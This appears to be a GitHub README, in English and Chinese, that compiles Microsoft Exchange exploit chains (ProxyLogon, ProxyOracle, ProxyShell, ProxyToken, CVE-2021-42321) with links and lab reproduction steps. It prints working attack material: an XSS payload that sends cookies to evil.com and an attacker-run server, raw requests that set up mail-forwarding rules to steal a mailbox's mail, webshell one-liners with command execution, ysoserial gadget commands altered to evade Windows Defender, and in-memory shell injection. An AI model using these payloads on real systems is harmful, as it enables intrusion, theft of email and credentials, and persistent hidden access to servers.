# Proxy-Attackchain

proxylogon & proxyshell & proxyoracle & proxytoken & all exchange server vulns summarization :)

1. ProxyLogon: The most well-known and impactful Exchange exploit chain
2. ProxyOracle: The attack which could recover any password in plaintext format of Exchange users
3. ProxyShell: The exploit chain demonstrated at [Pwn2Own 2021](https://twitter.com/thezdi/status/1379467992862449664) to take over Exchange and earn $200,000 bounty

ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! [Slides](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf) [Video](https://www.youtube.com/watch?v=5mqid-7zp8k)

 - ![](./pics/logo-black.png)

| NAME | CVE | patch time | description | avaliable |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| CVE-2018-8581 | [CVE-2018-8581]() |  |  | yes |
| CVE-2018-8302 | [CVE-2018-8302]() |  |  | yes |
| CVE-2019-1040 | [CVE-2019-1040]() |  |  | yes |
| CVE-2020-0688 | [CVE-2020-0688]() |  |  | yes |
| CVE-2020-16875 | [CVE-2020-16875]() |  |  | yes |
| CVE-2020-17083 | [CVE-2020-17083]() |  |  | yes |
| CVE-2020-17143 | [CVE-2020-17143]() |  |  | yes |
| CVE-2020-17144 | [CVE-2020-17144]() |  |  | yes |
| ProxyLogon (completed) | [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) | Mar 02, 2021 | server-side request forgery (SSRF) | yes |
| ProxyLogon (completed) | [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) | Mar 02, 2021 | Microsoft.Exchange.Management.DDIService.WriteFileActivity未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell | yes |
| ProxyOracle (completed) | [CVE-2021-31196](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196) | Jul 13, 2021 | Reflected Cross-Site Scripting | yes |
| ProxyOracle (completed) | [CVE-2021-31195](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195) | May 11, 2021 | Padding Oracle Attack on Exchange Cookies Parsing | yes |
| ProxyShell (completed) | [CVE-2021-34473](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473) | Apr 13, 2021 | Pre-auth Path Confusion leads to ACL Bypass | yes |
| ProxyShell (completed) | [CVE-2021-34523](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523) | Apr 13, 2021 | Elevation of Privilege on Exchange PowerShell Backend | yes |
| ProxyShell (completed) | [CVE-2021-31207](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207) | May 11, 2021 | Post-auth Arbitrary-File-Write leads to RCE | yes |
| proxytoken (completed) | [CVE-2021-33766](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33766) | July 13, 2021 | With this vulnerability, an unauthenticated attacker can perform configuration actions on mailboxes belonging to arbitrary users. As an illustration of the impact, this can be used to copy all emails addressed to a target and account and forward them to an account controlled by the attacker. | yes |
| Microsoft Exchange Server 远程执行代码漏洞 (completed) | [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321) | Nov 17, 2021 | Exchange Deserialization RCE | yes |
| ProxyRelay (test failed) | [CVE-2021-33768](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768) | July 13, 2021 | Relay to Exchange FrontEnd | yes |
| ProxyRelay (test failed) | [CVE-2022-21979](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979) | October 11, 2022 | Relay to Exchange BackEnd | yes |
| ProxyRelay (test failed) | [CVE-2021-26414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414) | June 8, 2021 | Relay to Exchange DCOM | yes |
| ProxyNotShell (completed) | [CVE-2022-41040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41040) | 2022年11月8日 | 服务端请求伪造(SSRF)漏洞 | yes |
| ProxyNotShell (completed) | [CVE-2022-41082](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41082) | 2022年11月8日 | 远程执行代码RCE漏洞 | yes |
| ProxyNotRelay |  |  |  | yes |
| OWASSRF(CVE-2022-41080) | [CVE-2022-41080]() |  |  | yes |
| TabShell(CVE-2022-41076) | [CVE-2022-41076]() |  |  | yes |
| CVE-2022-23277 | [CVE-2022-23277]() |  |  | yes |
| ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
| ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
| CVE-2023-21707 | [CVE-2023-21707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21707) | 2023年3月9日 | Microsoft Exchange Server 远程执行代码漏洞 | yes |

# CVE-2018-8581
## CVE-2018-8581 part links

 - [Exchange2domain](https://github.com/Ridter/Exchange2domain)
 - [CVE-2018-8581](https://github.com/WyAtu/CVE-2018-8581)


# CVE-2018-8302
## CVE-2018-8302 part links

 - []()

# CVE-2019-1040
## CVE-2019-1040 part links

 - [CVE-2019-1040 with Exchange](https://github.com/Ridter/CVE-2019-1040)
 - [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 - [CVE-2019-1040-dcpwn](https://github.com/Ridter/CVE-2019-1040-dcpwn)

# CVE-2020-0688
## CVE-2020-0688 part links

 - [CVE-2020-0688-Exchange-远程代码执行分析及复现](https://fdlucifer.github.io/2020/10/12/cve-2020-0688/)
 - [Ridter/cve-2020-0688](https://github.com/Ridter/cve-2020-0688/)

# CVE-2020-16875
## CVE-2020-16875 part links

 - [Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability](https://srcincite.io/pocs/cve-2020-16875.py.txt)

# CVE-2020-17083
## CVE-2020-17083 part links

 - [Microsoft Exchange Server ExportExchangeCertificate WriteCertiricate File Write Remote Code Execution Vulnerability](https://srcincite.io/pocs/cve-2020-17083.ps1.txt)
 - [CVE-2020-17083 Microsoft Exchange Server任意代码执行漏洞 POC](https://mp.weixin.qq.com/s/LMUMmuGfT3nmKN88O5hBAA)

# CVE-2020-17143
## CVE-2020-17143 part links

 - [Microsoft Exchange Server OWA OneDriveProUtilities GetWacUrl XML External Entity Processing Information Disclosure Vulnerability](https://srcincite.io/pocs/cve-2020-17143.py.txt)

# CVE-2020-17144
## CVE-2020-17144 part links

 - [CVE-2020-17144漏洞分析与武器化](https://www.zcgonvh.com/post/analysis_of_CVE-2020-17144_and_to_weaponizing.html)
 - [CVE-2020-17144 zcgonvh github exp](https://github.com/zcgonvh/CVE-2020-17144)
 - [Exchange2010 authorized RCE](https://github.com/Airboi/CVE-2020-17144-EXP)

# ProxyLogon (completed)
## ProxyLogon part links

 - [Proxylogon](https://proxylogon.com/)
 - [A New Attack Surface on MS Exchange Part 1 - ProxyLogon!](https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html)
 - [ProxyLogon漏洞分析](https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [复现Microsoft Exchange Proxylogon漏洞利用链](https://xz.aliyun.com/t/9305)

 - ![](pics/proxylogon.png)
 - ![](pics/proxylogon1.png)
 - ![](pics/proxylogon2.png)

# ProxyOracle (completed)
## ProxyOracle part links

 - [A New Attack Surface on MS Exchange Part 2 - ProxyOracle!](https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html)
 - [ProxyOracle漏洞分析](https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

Once a victim clicks this link, evil.com will receive the cookies.

``` bash
https://ews.lab/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.cookie=`X-AnonResource-Backend=@evil.com:443/path/any.php%23~1941962753`;document.cookie=`X-AnonResource=true`;fetch(`/owa/auth/any.skin`,{credentials:`include`});//
```

or use 3gstudent's way:

## step1: XSS平台搭建

借助SSRF漏洞，控制Exchange服务器将Cookie信息发送至XSS平台，导致最终想要的Cookie信息位于Request Headers中

而现有的XSS平台大都是通过POST请求的参数来传递数据

为了解决这个问题，这里可以选择开源的XSS平台，地址如下：

https://github.com/3gstudent/pyXSSPlatform

只需要修改以下位置：

 - 修改index.js，使用ajax模拟用户发包触发SSRF漏洞

 - 修改 pyXSSPlatform.py ，将GET请求的Request Headers进行提取

 - 使用合法的证书

index.js代码示例：

``` bash
var xmlHttp = new XMLHttpRequest();
xmlhttp.open("GET", "https://192.168.1.1/owa/auth/x.js", false);
document.cookie = "X-AnonResource=true";
document.cookie = "X-AnonResource-Backend=OurXssServer.com/#~1";
xmlhttp.send();
```

## step2: XSS利用代码

控制用户访问XSS平台的代码示例：

``` bash
https://192.168.1.1/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};document.head.appendChild(document.createElement(/script/.source)).src=/https:\/\/OurXssServer.com\/index.js/.source//
```

## step3: example cookie for decryption test:

``` bash
cadata=FVtSAAWdOn29HYDQry+kG+994VUdAxONrayi4nbJW9JWTh8yLueD6IxYpahfxcGsA/B3FoVUQOD2EG605SR4QdeQ1pof+KD//6jwpmYQjv/II+OcqChrFZFvcMWv46a5; cadataTTL=eTxCEHKHDMmd/gEqDuOafg==; cadataKey=T4juhN4dUMKY4wkajUD43n4EWfMwefPQlqzxXmK4GnSHIZqo+g+uQg1Y2ogGoD1HyoVpRYgjGcCu6rmNQK+LsaZ8/lfBCThBI5yAhP1W2Fx+YNKvzy8Bcpui7zTlhAY598lE5Aijs6crHVXJeZkbLfMJgp0cFHj5uTQPcg31O/AeOAnD5c27IYOQ7JqMW7GOUVor1lhYnhh0R/NtWWqyfr5oE9j0jbxIGgrQrXIpLxL/uAU1ddC+/5jG9Edpq4sC213amuU/94rkHYzNH9OsiHYIkXr/NmkB7p908XrFrwXAcvV9QieoRiS3jvKCbzk3mnMu3YTnsJwAuiHzSXdCOQ==; cadataIV=GB9B+rwrigyPOf8xnV1KAek++yovEot9jFcV68WepCTQoRtQ5HUxSC7tE1mmHg0YtE6EOZNUM/WiNGP6xI4UTAofcMOfTLeRpBzeaKOETfjxKK2W7IKn+9k2tRkc1pIlO8FTOVx/dOHOoIFHUkqxFr+TgBULJ1I7tUmO7W0XDX4ZJHfmQhVqOOzeyjImKdX7Uv/jIJrF4VEew7rgvrC8BhqOqWgaTxpGhDTzIXl+wW3crsgZmXpXhOPURej1iwmtvhuQU6iuq4/IRv0lVIW3WvP6gUI8owIUxppnJl7YmN27Aqkjs0nTZZz1LBuZN+YxY4x6Lvs2FMG68jllhE4kwg==; cadataSig=BOJSYN2B+3RsXjO2akh3mqlKKkeAZVamOzfpVo0QdPEA3BHjpR6ls5yD9TzAQzRuWJJaaRIm7wMEiBMFz/sK5jk3R6kWw1OmMtJN2c38PdvwGIe6/7ByJdl52a5ojhDrRZhc4Qc3y+FFRx6XKvqUljTRWtHJGI1Jad2+LiNhJGkalhUeTM/a2V4LiQWf6Vv1KzJO79rZuOOOBnatht/E29j6636FpllCfEKrrogPQ7ADdVS6OOmqNU9gRMVgKnomC2t2PCtuYj26HUjnZ3rfc6BdzVmtu9EYSzccObsB2jxXXclAm5a+NZU/6sj9tlq3gcurjBl9yUDTgbZLg383gw==
```

 - amd64 poc binary usage:
 - just a modyfied version of [padre](https://github.com/glebarez/padre), added proxyoracle detect poc code...
 - ![](pics/proxyoracle.png)

 - python script exp usage:

Decrypt this cookie to plaintext:

 - ![](pics/proxyoracle1.png)

# ProxyShell (completed)
## ProxyShell part links

 - [My Steps of Reproducing ProxyShell](https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/)
 - [ProxyShell漏洞分析](https://hosch3n.github.io/2021/08/24/ProxyShell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
 - [FROM PWN2OWN 2021: A NEW ATTACK SURFACE ON MICROSOFT EXCHANGE - PROXYSHELL!](https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)
 - [Reproducing The ProxyShell Pwn2Own Exploit](https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1)
 - [ProxyShell](https://github.com/ktecv2000/ProxyShell)
 - [A basic proxyshell scanner](https://github.com/dinosn/proxyshell)
 - [Generate proxyshell payload by Py Permutative Encoding](https://github.com/Ridter/proxyshell_payload)
 - [CVE-2021-34473-Exchange-ProxyShell](https://github.com/je6k/CVE-2021-34473-Exchange-ProxyShell)
 - [Exchange ProxyShell 远程代码执行漏洞复现](https://www.buaq.net/go-83692.html)
 - [exchange-proxyshell漏洞复现及分析](https://blog.riskivy.com/exchange-proxyshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/)
 - [Proof of Concept Exploit for Microsoft Exchange CVE-2021-34473, CVE-2021-34523, CVE-2021-31207](https://github.com/horizon3ai/proxyshell)

## short intro

 - CVE-2021-34473 - Pre-auth Path Confusion

This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL, it’s still powerful enough for us to conduct further attacks with arbitrary backend access.

``` bash
https://xxx.xxx.xxx.xxx/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com
```

 - CVE-2021-34523 - Exchange PowerShell Backend Elevation-of-Privilege
 - CVE-2021-31207 - Post-auth Arbitrary-File-Write

## let's getting started and split proxyshell part to part ......

generate proxyshell specified webshell payload.

 - [proxyshell_payload_gen.py](./proxyshell_payload_gen.py)

just put the webshell content you want to "webshell", then it will be fine...

 - ![](pics/proxyshell.png)

then put the encoded webshell to <t:Content>...</t:Content> in chkproxyshell.go

confirm proxyshell and get the sid value to generate token.

 - ![](pics/proxyshell1.png)

use the following py script to gen token value

 - ![](pics/proxyshell2.png)

confirm the token is valid

 - ![](pics/proxyshell3.png)

now use the token to send a email with shell attachment in, this may be saved as a draft in test user's mailbox...

 - ![](pics/proxyshell4.png)

 - ![](pics/proxyshell5.png)

 - ![](pics/proxyshell6.png)

finnaly use the following wsman python script to export The draft to webshell, sometimes may write shell failed, try one more time will be fine :)

 - ![](pics/proxyshell7.png)

 - ![](pics/proxyshell8.png)

 - ![](pics/proxyshell9.png)

access the shell and then execute the commands you want:

``` bash
view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(Response.Write('eeeeeeeeeeeeeeeeeeee lUc1f3r11 is here!!!!'));
```

shell is just work fine!!!

 - ![](pics/proxyshell10.png)

command exec:

``` bash
view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
```

 - ![](pics/proxyshell11.png)
 - ![](pics/proxyshell12.png)

## exploit proxyshell by using one click shell scripts from github

 - [proxyshell-auto](https://github.com/Udyz/proxyshell-auto)
 - [ProxyShell: More Ways for More Shells](https://www.horizon3.ai/proxyshell-more-ways-for-more-shells/)
 - ![](pics/proxyshell13.png)

## Pwn2Own 2021 Microsoft 3rd Exchange Exploit Chain (proxyshell but intresting exploit script)
### links

 - [Pwn2Own 2021 Microsoft Exchange Exploit Chain](https://blog.viettelcybersecurity.com/pwn2own-2021-microsoft-exchange-exploit-chain/)
 - [Pwn2Own2021MSExchangeExploit.py](https://gist.github.com/rskvp93/4e353e709c340cb18185f82dbec30e58)


# ProxyToken (completed)
## ProxyToken part links

 - [PROXYTOKEN: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server)
 - [CVE-2021-33766-ProxyToken](https://github.com/demossl/CVE-2021-33766-ProxyToken)
 - [CVE-2021-33766](https://github.com/bhdresh/CVE-2021-33766)

## proxytoken复现

 - Note: 此漏洞可被用来进行exchange邮箱窃取，钓鱼，社工角色伪装等，只需邮箱名无需任何密码即可利用

### burpsuite请求包分析

1. 第一步发送如下请求包查看proxytoken漏洞是否存在，其中test@exchange2016.com是攻击者想要读取邮件的那个邮箱地址

``` bash
GET /ecp/test@exchange2016.com/PersonalSettings/HomePage.aspx?showhelp=false HTTP/1.1
Host: 192.168.186.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: SecurityToken=x
```

返回响应包页面状态为200，响应头中存在"msExchEcpCanary="及值，代表漏洞存在

 - ![](pics/proxytoken.png)

2. 第二步发送如下请求包，构造邮件转发规则到test@exchange2016.com邮箱，后续所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱，从而实现任意邮箱读取

``` bash
POST /ecp/test@exchange2016.com/RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary=FrgLJ_16A0Wr_5nhVivj6vBJGbdFFtsIzwQBoOvKIiUzB1yV5wMJqzG8oRfNd1HWUKm33fyrJ-I. HTTP/1.1
Host: 192.168.186.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: SecurityToken=x
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 327


{"properties":{"RedirectTo":[{"RawIdentity":"proxymail@exchange2016.com","DisplayName":"proxymail@exchange2016.com","Address":"proxymail@exchange2016.com","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"proxymail@exchange2016.com"}],"Name":"Testrule","StopProcessingRules":true}}
```

返回响应包页面状态为200，响应内容如下，代表漏洞存在

``` bash
{"d":{"__type":"RuleRowResults:ECP","Cmdlets":["New-InboxRule"],"ErrorRecords":[],"Informations":[],"IsDDIEnabled":false,"Warnings":[],"Output":null}}
```

 - ![](pics/proxytoken1.png)

### golang proxytoken one click exploit

 - [proxytoken.go](./proxytoken.go)
 - Use Options:

``` bash
-te: is the email that you want to redirect to...
-ve: is the email that you want to attack and read the email ...
```

 - ![](pics/proxytoken2.png)

邮件转发规则修改结果

 - ![](pics/proxytoken3.png)

邮件发送测试，如下图，所有administrator@exchange2016.com发送给test@exchange2016.com邮箱的邮件，都会被重新转发一份给proxymail@exchange2016.com邮箱

 - ![](pics/proxytoken4.png)
 - ![](pics/proxytoken5.png)
 - ![](pics/proxytoken6.png)

# Exchange Authenticated RCE CVE-2021-42321 (completed)
## CVE-2021-42321 part links

 - [Get started with EWS client applications](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-client-applications)
 - [Phân tích bản vá tháng 11 của Microsoft Exchange](https://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/)
 - [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321)
 - [Some notes about Microsoft Exchange Deserialization RCE (CVE-2021–42321)](https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852)
 - [DotNet安全-CVE-2021-42321漏洞复现](https://mp.weixin.qq.com/s/t6aVu1Nk-1xXcs-ohdBnig)
 - [Exchange漏洞系列分析二【Exchange 反序列化代码执行漏洞 (CVE-2021–42321)】](https://mp.weixin.qq.com/s/V3UIT7xJmV5iJ33-kFAAhQ)
 - [Exchange 反序列化漏洞分析（一）](https://mp.weixin.qq.com/s/QSE4trL-AOgvChJ8UTp7OQ)
 - vuln version & patched version go to [How Tanium Can Help with the November 2021 Exchange Vulnerabilities (CVE-2021-42321)](https://community.tanium.com/s/article/How-Tanium-Can-Help-with-the-November-2021-Exchange-Vulnerabilities-CVE-2021-42321)
 - [exch_CVE-2021-42321](https://github.com/7BitsTeam/exch_CVE-2021-42321)
 - [CVE-2021-42321-天府杯Exchange 反序列化漏洞分析](https://www.wangan.com/p/7fygf33f38821d6b)
 - [CVE-2021-42321_poc.py](./CVE-2021-42321_poc.py)

Exchange 2016 CU 21,22 and Exchange 2019 CU 10,11. This means the only recent latest version of Exchange 2016,2019 are vulnerable to this CVE

1. Create UserConfiguration with BinaryData as our Gadget Chain
2. Request to EWS for GetClientAccessToken to trigger the Deserialization

 - vulnerable exchange versions

``` bash
Exchange Server 2016 CU22 <= Oct21SU 15.1.2375.12 15.01.2375.012
Exchange Server 2016 CU21 <= Oct21SU 15.1.2308.15 15.01.2308.015
Exchange Server 2019 CU11 <= Oct21SU 15.2.986.9 15.02.0986.009
Exchange Server 2019 CU10 <= Oct21SU 15.2.922.14 15.02.0922.014
```

## 直接修改ysoserial.net为写入aspx webshell

实际在利用的过程中遇到的500错误，原因是从ProxyLogon, ProxyShell开始，直到现在一些edr,AV,sysmon和Microsoft Windows Defender都试图捕获和阻止来自w3wp.exe进程的衍生进程。所以w3wp进程启动的进程被Definder拦截了。

这样的话只要修改ysoserial的代码功能为写文件即可利用，而不用启动其它进程。

修改后[TypeConfuseDelegateGenerator](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator.cs)

 - ![](./pics/TypeConfuseDelegateGenerator.png)

与原来的[TypeConfuseDelegateGenerator-origin](./exch_CVE-2021-42321/TypeConfuseDelegateGenerator-origin.cs)对比

 - ![](./pics/TypeConfuseDelegateGenerator1.png)

``` bash
TypeConfuse链改为写入文件，即可绕过 windows definder 的 w3wp.exe启动进程。
将此文件覆盖ysoserial.net原始文件，重新编译即可。
```

然后运行如下命令生成gadget chain:

``` bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "1" -t
```

替换原poc中的gadget，即可成功写入webshell

修改了原poc，添加了写入如下两种shell的gadget chain:

 - luci.aspx

``` bash
a<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>
```

 - atobshell.aspx

``` bash
a<%@ Page Language=\'JScript\' Debug=\'true\'%><%@Import Namespace=\'System.IO\'%><%File.WriteAllBytes(Request[\'b\'], Convert.FromBase64String(Request[\'a\']));%>
```

 - [CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py)

运行脚本，成功写入两个webshell，方便后续各种操作

 - ![](./pics/TypeConfuseDelegateGenerator2.png)

 - ![](./pics/TypeConfuseDelegateGenerator3.png)

``` bash
view-source:https://192.168.186.135/aspnet_client/luci.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
```

 - ![](./pics/TypeConfuseDelegateGenerator4.png)

## 添加植入内存马gadget chain

change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitation of .NET and later inject DLL to achieve mem-shell with Jscript to bypass the detection

### .net mem-shell researchs resources

1. 首先在注入memory shell之前，需要将DisableActivitySurrogateSelectorTypeCheck更改为True以绕开.NET的限制，这里使用[ysoserial.net](https://github.com/pwntester/ysoserial.net)官方仓库的ClaimsPrincipal + ActivitySurrogateDisableTypeCheck相结合的gadget chain

Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.

``` bash
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```

将这个ClaimsPrincipal+ActivitySurrogateDisableTypeCheck反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py) exp脚本中

 - ![](./pics/memshell2.png)

 - ![](./pics/memshell3.png)

将DisableActivitySurrogateSelectorTypeCheck更改为True以绕开.NET的限制后，使用弹计算器的TypeConfuseDelegate未修改版本gadget chain在目标上弹出计算器，以确认DisableActivitySurrogateSelectorTypeCheck成功更改为True

 - origin TypeConfuseDelegate chain

``` bash
.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "calc" -t
```

 - ![](./pics/memshell13.png)

2. 此处通过反序列化生成内存马的方式主要参考：

 - [DotNet内存马-HttpListener](https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w)
 - [.Net 内存马改造](https://cloud.tencent.com/developer/article/1915652)
 - [Memshell-HttpListener](https://github.com/A-D-Team/SharpMemshell/tree/main/HttpListener)

按照Memshell-HttpListener的github仓库中的说明编译内存马的.dll文件

``` bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Web.dll,System.dll,Microsoft.CSharp.dll,System.Core.dll /t:library memshell.cs
```

编译完之后会在目录下生成一个memshell.dll文件，将其改名为e.dll后续生成反序列化链需要用到

 - [HttpListener - e.dll](./HttpListener/e.dll)
 - ![](./pics/memshell.png)

将e.dll文件复制到ysoserial.exe的bin目录中

 - ![](./pics/memshell1.png)

现在生成加载e.dll，注入内存马的ClaimsPrincipal + ActivitySurrogateSelector结合的gadget chain

[ActivitySurrogateSelectorGenerator.cs](./ysoserial.net-modified/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs)文件中加载e.dll的流程

 - ![](./pics/memshell4.png)
 - ![](./pics/memshell5.png)

及自带的Disable ActivitySurrogate type protections during generation功能

 - ![](./pics/memshell6.png)

``` bash
.\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateSelector --minify --ust
```

将这个ClaimsPrincipal+ActivitySurrogateSelector反序列化链添加到[CVE-2021-42321_shell_write_exp.py](./CVE-2021-42321_shell_write_exp.py) exp脚本中

 - ![](./pics/memshell7.png)
 - ![](./pics/memshell8.png)

 - 本地测试最终exp

1. exp运行前:

 - ![](./pics/memshell9.png)

2. 运行exp脚本，一键注入.net内存马

 - ![](./pics/memshell10.png)

3. 查看内存马命令执行效果

``` bash
curl http://192.168.186.135/favicon.ico -H "Type: cmd"  -d "pass=whoami"
```

 - ![](./pics/memshell11.png)
 - ![](./pics/memshell12.png)


#### note: 后续会另开一个github仓库深入分析.net内存马原理和实战利用方式
 - [asp.net无法getshell的一些解决办法](https://y4er.com/posts/aspnet-getshell-tips/)
 - [浅谈DotNET 内存马 Filter](https://www.crisprx.top/archives/547)
 - [浅谈 DotNet 内存马 Route](https://www.crisprx.top/archives/552)
 - [浅谈 DotNet 内存马 HttpListener](https://www.crisprx.top/archives/555)
 - [ASP.NET下的内存马(1) filter内存马](https://tttang.com/archive/1408/)
 - [ASP.NET下的内存马(2) Route内存马](https://tttang.com/archive/1420/)
 - [ASP.NET下的内存马(3) HttpListener内存马](https://tttang.com/archive/1451/)
 - [ASP.NET下的内存马(4) VirtualPath内存马](https://tttang.com/archive/1488/)
 - [渗透技巧——利用虚拟文件隐藏ASP.NET Webshell](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell)
 - [从内存加载.NET程序集(Assembly.Load)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
 - [从内存加载.NET程序集(execute-assembly)的利用分析](https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90)
 - [利用JS加载.Net程序](https://3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F)
 - [通过.NET实现内存加载PE文件](https://3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6)


### 修复

KB5007409得到修复，最终反序列化的地方, 此处

 - ![](./pics/repair.png)

this.formatter为IClientExtensionCollectionFormatter的实现，仅剩

``` bash
Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream):
    Collection
```

1. TypeConfuseDelegate 链

(1). 初始化 Formatter 的 Binder 属性时，将一个恶意类置入了白名单，导致内置的黑名单过滤失效。

(2). ChainedSerializationBinder 黑名单中某个类拼写错误，导致内置的黑名单过滤失效。

ClientExtensionCollectionFormatter.Deserialize() 改为使用 ExchangeBinaryFormatterFactory.CreateBinaryFormatter() 创建 Formatter 再反序列化数据，并且其 allowedTypes 设为空，而不是直接使用 TypedBinaryFormatter，甚至直接删除了 TypedBinaryFormatter 类。

2. ClaimsPrincipal 链

